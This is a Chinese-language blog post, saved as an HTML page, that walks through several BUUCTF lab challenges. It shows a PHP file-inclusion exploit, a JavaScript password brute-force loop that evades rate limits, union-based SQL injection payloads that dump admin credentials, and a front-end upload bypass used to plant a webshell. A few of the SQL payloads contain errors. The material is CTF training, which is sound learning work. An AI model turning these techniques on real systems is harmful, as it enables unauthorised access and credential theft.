@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>BUUCFT 题解 - Bigshans&#39; Blog</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="bigshans" />
+<meta name="description" content="娱乐性质，玩一玩。 Linux Lab 使用 ssh 连接到靶机即可。 ssh root@address -p port flag.txt 就放在根目录下面。 BUUCFT 打开页面，首先给了一段代码。 &amp;lt;?php /** * Created by PhpStorm. * User: jinzhao * Date: 2019/7/9 * Time: 7:07 AM */ highlight_file(__FILE__); if(isset($_GET[&amp;#39;file&amp;#39;]))" /><meta name="keywords" content="Hugo, theme, even" />
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.112.0-DEV with theme even" />
+
+
+<link rel="canonical" href="https://bigshans.github.io/post/buucft/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+<link href="/sass/main.min.c00e94730a6b40627ede15c565a0d79571bffdc2a57669406c4d3099af8ca3b4.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+<link rel="stylesheet" href="/css/custom.css">
+
+
+
+
+
+<meta property="og:title" content="BUUCFT 题解" />
+<meta property="og:description" content="娱乐性质，玩一玩。 Linux Lab 使用 ssh 连接到靶机即可。 ssh root@address -p port flag.txt 就放在根目录下面。 BUUCFT 打开页面，首先给了一段代码。 &lt;?php /** * Created by PhpStorm. * User: jinzhao * Date: 2019/7/9 * Time: 7:07 AM */ highlight_file(__FILE__); if(isset($_GET[&#39;file&#39;]))" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://bigshans.github.io/post/buucft/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2023-07-23T08:19:53+08:00" />
+<meta property="article:modified_time" content="2023-07-23T08:19:53+08:00" />
+<meta itemprop="name" content="BUUCFT 题解">
+<meta itemprop="description" content="娱乐性质，玩一玩。 Linux Lab 使用 ssh 连接到靶机即可。 ssh root@address -p port flag.txt 就放在根目录下面。 BUUCFT 打开页面，首先给了一段代码。 &lt;?php /** * Created by PhpStorm. * User: jinzhao * Date: 2019/7/9 * Time: 7:07 AM */ highlight_file(__FILE__); if(isset($_GET[&#39;file&#39;]))"><meta itemprop="datePublished" content="2023-07-23T08:19:53+08:00" />
+<meta itemprop="dateModified" content="2023-07-23T08:19:53+08:00" />
+<meta itemprop="wordCount" content="826">
+<meta itemprop="keywords" content="BUUCFT,题解," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="BUUCFT 题解"/>
+<meta name="twitter:description" content="娱乐性质，玩一玩。 Linux Lab 使用 ssh 连接到靶机即可。 ssh root@address -p port flag.txt 就放在根目录下面。 BUUCFT 打开页面，首先给了一段代码。 &lt;?php /** * Created by PhpStorm. * User: jinzhao * Date: 2019/7/9 * Time: 7:07 AM */ highlight_file(__FILE__); if(isset($_GET[&#39;file&#39;]))"/>
+
+
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+
+
+<script type="text/javascript" src="/js/filled.js"></script>
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Bigshans</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/">
+        <li class="mobile-menu-item fa">
+          
+            <i class="fa-home"></i>
+          
+
+          首页
+        </li>
+      </a><a href="/post/">
+        <li class="mobile-menu-item fa">
+          
+            <i class="fa-archives"></i>
+          
+
+          归档
+        </li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item fa">
+          
+            <i class="fa-tags"></i>
+          
+
+          标签
+        </li>
+      </a><a href="/categories/">
+        <li class="mobile-menu-item fa">
+          
+            <i class="fa-categories"></i>
+          
+
+          分类
+        </li>
+      </a>
+  </ul>
+
+  
+
+
+</nav>
+
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">Bigshans</a>
+</div>
+
+
+
+
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <span class="fa">
+          
+            <i class="fa-home"></i>
+          
+        </span>
+        <a class="menu-item-link" href="/">首页</a>
+      </li><li class="menu-item">
+        <span class="fa">
+          
+            <i class="fa-archives"></i>
+          
+        </span>
+        <a class="menu-item-link" href="/post/">归档</a>
+      </li><li class="menu-item">
+        <span class="fa">
+          
+            <i class="fa-tags"></i>
+          
+        </span>
+        <a class="menu-item-link" href="/tags/">标签</a>
+      </li><li class="menu-item">
+        <span class="fa">
+          
+            <i class="fa-categories"></i>
+          
+        </span>
+        <a class="menu-item-link" href="/categories/">分类</a>
+      </li>
+  </ul>
+</nav>
+
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">BUUCFT 题解</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2023-07-23 </span>
+        <div class="post-category">
+            <a href="/categories/buucft/"> BUUCFT </a>
+            </div>
+          <span class="more-meta"> 约 826 字 </span>
+          <span class="more-meta"> 预计阅读 2 分钟 </span>
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#linux-lab">Linux Lab</a></li>
+        <li><a href="#buucft">BUUCFT</a></li>
+        <li><a href="#暴力破解-1">暴力破解 1</a></li>
+        <li><a href="#buu-sql-course-1">BUU SQL COURSE
+1</a></li>
+        <li><a href="#upload-labs-linux-1">Upload-Labs-Linux 1</a>
+          <ul>
+            <li><a href="#pass-1">Pass 1</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+</div>
+
+    <div class="post-content">
+      
+
+<p>娱乐性质，玩一玩。</p>
+<h2 id="linux-lab">Linux Lab</h2>
+<p>使用 ssh 连接到靶机即可。</p>
+<pre class="shell"><code>ssh root@address -p port</code></pre>
+<p>flag.txt 就放在根目录下面。</p>
+<h2 id="buucft">BUUCFT</h2>
+<p>打开页面，首先给了一段代码。</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;?php</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="co">/**</span></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a><span class="co"> * Created by PhpStorm.</span></span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a><span class="co"> * User: jinzhao</span></span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a><span class="co"> * Date: 2019/7/9</span></span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a><span class="co"> * Time: 7:07 AM</span></span>
+<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a><span class="co"> */</span></span>
+<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a><span class="fu">highlight_file</span>(<span class="cn">__FILE__</span>)<span class="ot">;</span></span>
+<span id="cb2-10"><a href="#cb2-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-11"><a href="#cb2-11" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span>(<span class="kw">isset</span>(<span class="va">$_GET</span>[<span class="st">&#39;file&#39;</span>])) {</span>
+<span id="cb2-12"><a href="#cb2-12" aria-hidden="true" tabindex="-1"></a>    <span class="va">$str</span> <span class="op">=</span> <span class="va">$_GET</span>[<span class="st">&#39;file&#39;</span>]<span class="ot">;</span></span>
+<span id="cb2-13"><a href="#cb2-13" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-14"><a href="#cb2-14" aria-hidden="true" tabindex="-1"></a>    <span class="kw">include</span> <span class="va">$_GET</span>[<span class="st">&#39;file&#39;</span>]<span class="ot">;</span></span>
+<span id="cb2-15"><a href="#cb2-15" aria-hidden="true" tabindex="-1"></a>}</span></code></pre></div>
+<p>这里的意思是，高亮当前文件，判断是否存在为 file 的 query
+参数，如果存在，就加载它。</p>
+<p>尝试一下 <code>?file=flag.txt</code> ，文件不存在；尝试
+<code>?file=flag</code> ，页面中显示了 flag 。</p>
+<h2 id="暴力破解-1">暴力破解 1</h2>
+<p>首先是一个登录页面，查看了一下 HTML
+代码，很干净，没有任何其他的东西。尝试写了句 SQL
+注入，不行，所以没有注入的口子。</p>
+<p><img src="../img/buuctf_brute_1.png"/></p>
+<p>尝试用户名，是 admin 。尝试密码 1234
+，结果报密码错误，密码为四位数字。这里就只能写代码遍历所有四位整数了。因为频繁请求会被
+429 ，但慢慢请求又太慢，所以只能遇到一个 429 就等待一下。</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> <span class="fu">sleep</span>(time) {</span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="kw">new</span> <span class="bu">Promise</span>((resolve) <span class="kw">=&gt;</span> {</span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a>        <span class="pp">setTimeout</span>(resolve<span class="op">,</span> time)<span class="op">;</span></span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a>    })<span class="op">;</span></span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a>}</span>
+<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a>(<span class="kw">async</span> () <span class="kw">=&gt;</span> {</span>
+<span id="cb3-8"><a href="#cb3-8" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> (<span class="kw">let</span> i <span class="op">=</span> <span class="dv">1000</span><span class="op">;</span> i <span class="op">&lt;=</span> <span class="dv">9999</span><span class="op">;</span> i<span class="op">++</span>) {</span>
+<span id="cb3-9"><a href="#cb3-9" aria-hidden="true" tabindex="-1"></a>        <span class="kw">const</span> result <span class="op">=</span> <span class="cf">await</span> <span class="fu">fetch</span>(</span>
+<span id="cb3-10"><a href="#cb3-10" aria-hidden="true" tabindex="-1"></a>            <span class="st">&#34;http://26a432d9-687e-4232-a5ae-68052673cfa1.node4.buuoj.cn:81/?username=admin&amp;password=&#34;</span> <span class="op">+</span></span>
+<span id="cb3-11"><a href="#cb3-11" aria-hidden="true" tabindex="-1"></a>            i<span class="op">,</span></span>
+<span id="cb3-12"><a href="#cb3-12" aria-hidden="true" tabindex="-1"></a>        )<span class="op">.</span><span class="fu">then</span>((res) <span class="kw">=&gt;</span> res<span class="op">.</span><span class="fu">text</span>())<span class="op">;</span></span>
+<span id="cb3-13"><a href="#cb3-13" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-14"><a href="#cb3-14" aria-hidden="true" tabindex="-1"></a>        <span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(i)<span class="op">;</span></span>
+<span id="cb3-15"><a href="#cb3-15" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> (<span class="op">!</span>result<span class="op">.</span><span class="fu">startsWith</span>(<span class="st">&#34;密码错误&#34;</span>)) {</span>
+<span id="cb3-16"><a href="#cb3-16" aria-hidden="true" tabindex="-1"></a>            <span class="cf">if</span> (result<span class="op">.</span><span class="fu">includes</span>(<span class="st">&#34;429&#34;</span>)) {</span>
+<span id="cb3-17"><a href="#cb3-17" aria-hidden="true" tabindex="-1"></a>                <span class="cf">await</span> <span class="fu">sleep</span>(<span class="dv">500</span>)<span class="op">;</span></span>
+<span id="cb3-18"><a href="#cb3-18" aria-hidden="true" tabindex="-1"></a>                i<span class="op">--;</span></span>
+<span id="cb3-19"><a href="#cb3-19" aria-hidden="true" tabindex="-1"></a>                <span class="cf">continue</span><span class="op">;</span></span>
+<span id="cb3-20"><a href="#cb3-20" aria-hidden="true" tabindex="-1"></a>            }</span>
+<span id="cb3-21"><a href="#cb3-21" aria-hidden="true" tabindex="-1"></a>            <span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(result)<span class="op">;</span></span>
+<span id="cb3-22"><a href="#cb3-22" aria-hidden="true" tabindex="-1"></a>            <span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(i)<span class="op">;</span></span>
+<span id="cb3-23"><a href="#cb3-23" aria-hidden="true" tabindex="-1"></a>            <span class="cf">break</span><span class="op">;</span></span>
+<span id="cb3-24"><a href="#cb3-24" aria-hidden="true" tabindex="-1"></a>        }</span>
+<span id="cb3-25"><a href="#cb3-25" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb3-26"><a href="#cb3-26" aria-hidden="true" tabindex="-1"></a>})()<span class="op">;</span></span></code></pre></div>
+<p>跑完后，结果是 6490 。</p>
+<h2 id="buu-sql-course-1">BUU SQL COURSE 1</h2>
+<p>看题目是 SQL 注入。</p>
+<p>登录没有注入，是个幌子。注入点在获取新闻详情里。</p>
+<p>使用 <code>id=1 and 1=1</code> ，无报错，正常回显，存在注入。</p>
+<p>这里使用手动注入，首先要确定 SQL 返回结果的列数，使用
+<code>id=1 order by 1</code> 来一个个往后推，到
+<code>id=1 order by 3</code> 时结果有错，因此，结果字段是两列。</p>
+<p>接下来确定数据库，<code>id=1 union select 1, database()</code> 。</p>
+<p>然后确定数据库内有哪些表，<code>id=1 union select 1, group_concat(table_name) from information.tables where table_schema=&#39;news&#39;</code>
+。</p>
+<p>确定有哪些列，<code>id=1 union select 1, group(column_name) from information.columns where table_name=&#39;admin&#39;</code>
+。</p>
+<p>最后拿到 admin
+的密码，<code>id=1 union select username,password from admin</code></p>
+<p>登录就可以拿到 flag 了。</p>
+<p>关于 <code>information_schema</code> ：</p>
+<ol type="1">
+<li>猜库：select schema_name from information_schema.schema</li>
+<li>猜库中的表：select table_name from information_schema.tables where
+table_shcema=“xxx”</li>
+<li>猜表中列：select column_name from information_schema.columns where
+table_name=“xxx”</li>
+</ol>
+<h2 id="upload-labs-linux-1">Upload-Labs-Linux 1</h2>
+<h3 id="pass-1">Pass 1</h3>
+<p>提示说用了前端 JS 检查。因为本身 form 就可以上传文件，而 JS
+在这里只是起到了检查的作用，我们直接禁用 JS
+即可。当然，我们也可以通过接口请求来绕过，只要不走这个 JS 就行。</p>
+<p>我们需要上传一个 <a href="https://github.com/WhiteWinterWolf/wwwolf-php-webshell">webshell</a>
+，因为我用的需要上传两个文件，所以就上传了两遍。完成后查看回显地址，找到我们的
+webshell 链接。一旦打开，我们就成功骇入了。</p>
+<p>执行 <code>cat /flag</code> 即可获得 flag 。</p>
+
+
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">bigshans</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+        2023-07-23
+        
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="/tags/buucft/">BUUCFT</a>
+          <a href="/tags/%E9%A2%98%E8%A7%A3/">题解</a>
+          </div>
+      <nav class="post-nav">
+        <a class="prev" href="/post/%E5%A4%87%E5%BF%98%E5%BD%95/">
+            <i class="iconfont icon-left"></i>
+            <span class="prev-text nav-default">[置顶] 备忘录</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        <a class="next" href="/post/obsidian-%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C/">
+            <span class="next-text nav-default">Obsidian 使用体验</span>
+            <span class="next-text nav-mobile">下一篇</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+  <div style="display: flex; align-items: center; justify-content: center;">
+    <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-sa/4.0/88x31.png" /></a>
+  <div style="font-size: 12px; margin-left: 10px">
+    This work is licensed under a <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License</a>.
+  </div>
+  </div>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="https://github.com/bigshans" class="iconfont icon-github" title="github"></a>
+  <a href="https://bigshans.github.io/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    由 <a class="hexo-link" href="https://gohugo.io">Hugo</a> 强力驱动
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    主题 - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    2020 - 
+    2023<span class="heart"><i class="iconfont icon-heart"></i></span><span>bigshans</span>
+  </span>
+</div>
+
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  <script src="/lib/highlight/highlight.pack.js?v=20171001"></script>
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+
+
+
+<script type="text/javascript" src="/js/main.min.4ae89da218555efa0e7093a20b92017d2e1202b66fff9fc2edf4cb8d44b44c6e.js"></script>
+  <script type="text/javascript">
+    window.MathJax = {
+      tex: {
+        inlineMath: [['$','$'], ['\\(','\\)']],
+        }
+    };
+  </script>
+  <script async src="https://cdn.jsdelivr.net/npm/mathjax@3.0.5/es5/tex-mml-chtml.js" integrity="sha256-HGLuEfFcsUJGhvB8cQ8nr0gai9EucOOaIxFw7qxmd+w=" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+</body>
+</html>
